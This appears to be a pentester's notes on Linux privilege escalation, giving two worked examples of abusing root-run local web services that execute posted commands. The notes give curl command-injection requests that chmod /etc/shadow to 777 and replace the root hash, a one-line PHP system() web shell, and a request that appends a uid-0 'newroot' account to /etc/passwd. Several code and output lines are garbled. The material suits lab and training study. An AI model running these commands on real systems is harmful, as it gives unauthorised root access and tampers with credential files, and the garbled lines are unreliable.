#### Example 1
Say we find a listener on port 8080 running as root.  We can try using curl to POST data to it, first may need to find the files related to that port:

[[find]]
```
find / -iname *.php* 2>/dev/null
```

```
find / -iname *.html* 2>/dev/null
```


```
cat start_page.php
```

Here we can see reference of cmd.php page.

`<li class="start <?php if ($page=='cmd.php'){echo 'selected’';}?>"><a href="/start_page.php?page=cmd.php">CMD</a></1i>
`
```
cat cmd.php
```

Here we see on the cmd.php page that we can POST data to it and it will run the command.

```
<fieldset> 
	<form action="/start_page.php?page=cnd.php" method="POST"> 
		<p>Command: <input name="cmd” id="cmd" value="<?php echo $cmd; ?>" onClick="this.select();" type="text" /></p>
		<p><input name="send" style="margin-left: 150px;" class="formbutton" value="CMD It!® type="submit® /></p>
```

```
curl -X POST 0.0.0.0:8080/start_page.php?page=cmd.php --data cmd='id'
```

Next start testing what you can do with passwd and shadow files.  Below, we will chmod shadow file and replace hash vaule.

```
curl -X POST 0.0.0.0:8080/start_page.php?page=cmd.php --data cmd='chmod 777 /etc/shadow'
```

```
curl -X POST 0.0.0.0:8080/start_page.php?page=cmd.php --data cmd='cat /etc/shadow'
```

Copy contents to local shadow file on kali to edit and send back.

```bash - kali
mkpasswd -m sha-512 password
```

`$6$5gnWUgDEXJ.J.X3s$truKvZr/Vl7o5SIb.TEgR44LyihHNUoCZnt4PIIO31EyTOc6Pfccd1AYdwwp2Vj1CT.1y1vpxroyvuhxCYKGl/`

Replace root password hash with above, send to target and replace /etc/shadow

```
su root
```

```
password
```

#### Example 2

[[4._POST_EXPLOITATION/1._Linux_PrivEsc/1._Manual Enumeration#System Enumeration]]

`root 2056 0.0 0.0 2244 536 2 Ss 10:56 0:00 /bin/sh -c cd /home/jeremy & z-cmd -5 127.0.0.1:8989`
`root 2057 0.0 0.1 16660 3156 ? 5 10156 0:00 z-cmd -5 127.0.0.1:8389`

```
cat z-cmd
```

`<?php system($_POST[]'z'1]); ?>`

```
curl -X POST --data z='touch /home/jeremy/Ztest' 127.0.0.1:8989/z-cmd.php
```

Generate a password hash for the password “password”

using openssl :

```
openssl passwd "password"
```

```
curl -X POST --data z=' echo newroot:Ar4farDnTEYmw:0:0:root:/root:/bin/bash >> /etc/passwd' 127.0.0.1:8989/z-cmd.php
```

```
cat /etc/passwd | grep root
```

`root:x:0:0:root:/root: /bin/bash`
`newroot :LIYLGXcbOROC: 0 0: root: /root: /bin/bash`

```
su newroot
```

```
password
```